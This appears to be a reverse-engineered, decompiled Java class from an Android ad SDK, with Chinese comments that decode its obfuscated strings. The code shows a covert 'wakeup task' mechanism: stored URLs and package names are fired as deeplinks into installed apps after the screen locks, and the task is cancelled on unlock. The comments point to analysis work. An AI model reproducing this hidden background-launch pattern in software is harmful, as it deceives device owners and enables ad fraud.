package com.kkwinter.thirdsdk.advworkflow.b;


import android.annotation.SuppressLint;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;

import com.kkwinter.thirdsdk.advworkflow.util.j;
import com.kkwinter.thirdsdk.advworkflow.util.k;
import com.kkwinter.thirdsdk.advworkflow.util.o;
import com.kkwinter.thirdsdk.advworkflow.util.p;
import com.kkwinter.thirdsdk.advworkflow.util.o.b;

import org.json.JSONArray;
import org.json.JSONObject;


/**
 * deeplink task 操作类，锁屏时开启
 */
public final class m implements b {
    private static String a = f.a("FCLiJhYgJ/IEqP9u1lcApBW9KQ==");    // adv_tag_wakeup_task
    private static m b;
    private o c;
    private Context d;
    private Runnable e;


    public static m a(Context var0) {
        synchronized (m.class) {
        }

        m var3;
        try {
            if (b != null) {
                var3 = b;
            } else {
                var3 = new m(var0);
                b = var3;
            }
        } finally {
            ;
        }

        return var3;
    }

    private m(Context var1) {
        // 注册广播回调
        this.c = new o(var1);
        this.c.a(this);

        // 开线程，准备任务
        this.d = var1;
        this.e = new Runnable() {
            public final void run() {
                m.this.a();
            }
        };
    }


    protected final void a() {
        m.a var1;

        do {
            var1 = this.f();
            if (var1 == null) {
                return;
            }
        } while (!a(this.d, var1.b));
        //循环拿task，拿到到task对应到app安装，开始执行


        //两种方式开启deeplink
        this.b(var1.a);
        this.a(var1.a);
    }



    // 取出m.a对象，a中有url和packageName
    private a f() {
        try {
            //sp中取出存的task json
            JSONObject localJSONObject = new JSONObject(p.b(this.d, a, f.a("Djs=")));                // adv_tag_wakeup_task  {}

            //json中取出tasks
            JSONArray localJSONArray1 = k.a(localJSONObject, f.a("ASfnEhE="), new JSONArray());      // tasks

            if (localJSONArray1.length() == 0) {
                a(new JSONObject());
                return null;
            }

            //每次取index = 0位置的task，
            a locala = new a();
            locala.a = localJSONArray1.getJSONObject(0).getString(f.a("ADT4"));                // url
            locala.b = localJSONArray1.getJSONObject(0).getString(f.a("BSf3EgMmJeMSpPE="));    // packageName


            //把剩下的再存到sp中
            JSONArray localJSONArray2 = new JSONArray();

            int i = 1;
            while (i < localJSONArray1.length()) {
                localJSONArray2.put(localJSONArray1.getJSONObject(i));
                i += 1;
            }

            localJSONObject.put(f.a("ASfnEhE="), localJSONArray2);       // tasks
            a(localJSONObject);
            return locala;
        } catch (Exception localException) {
            a(new JSONObject());
        }
        return null;
    }


    //判断是否安装该应用
    private static boolean a(Context var0, String var1) {
        if (var0 != null && var1 != null) {
            try {
                var0.getPackageManager().getPackageInfo(var1, 0);
                return true;
            } catch (Exception var2) {
                return false;
            }
        } else {
            return false;
        }
    }




    //开启url的app
    private boolean a(String var1) {
        Intent var3 = new Intent("android.intent.action.VIEW", Uri.parse(var1));

        try {
            PendingIntent.getActivity(this.d, 0, var3, 0).send();
            return true;
        } catch (Exception var2) {
            return false;
        }
    }

    // 开启url的app
    private boolean b(String var1) {
        Intent var3 = new Intent("android.intent.action.VIEW", Uri.parse(var1));
        var3.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

        try {
            this.d.startActivity(var3);
            return true;
        } catch (Exception var2) {
            return false;
        }
    }



    // 取出adv_tag_wakeup_task 中task的间隔时间
    private int e() {
        try {
            int var1 = k.a(new JSONObject(p.b(this.d, a, f.a("Djs="))), f.a("HCjgHBA3IcE="), 45);   // {}    interval
            return var1;
        } catch (Exception var3) {
            return 45;
        }
    }


    // 存 adv_tag_wakeup_task
    public final void a(JSONObject var1) {
        try {
            p.a(this.d, a, var1.toString(0));
        } catch (Exception var2) {
            ;
        }
    }

    //开屏回调
    public final void b() {
        try {
            j.b(this.e);  // 关闭runnable任务
        } catch (Exception var2) {
            ;
        }
    }

    //锁屏回调
    public final void c() {
        j.a(this.e, (long) (this.e() * 1000));    // 按照延迟时间，开启runnable任务
    }

    //解锁回调
    public final void d() {
        try {
            j.b(this.e);   // 关闭runnable任务
        } catch (Exception var2) {
            ;
        }
    }


    public final class a {
        public String a;
        public String b;

        public a() {
        }

        public final String toString() {
            return f.a("ADT4RA==") + this.a + f.a("VTb1GgkgJ8g9qPlung==") + this.b;   // url=      packageName=
        }
    }
}
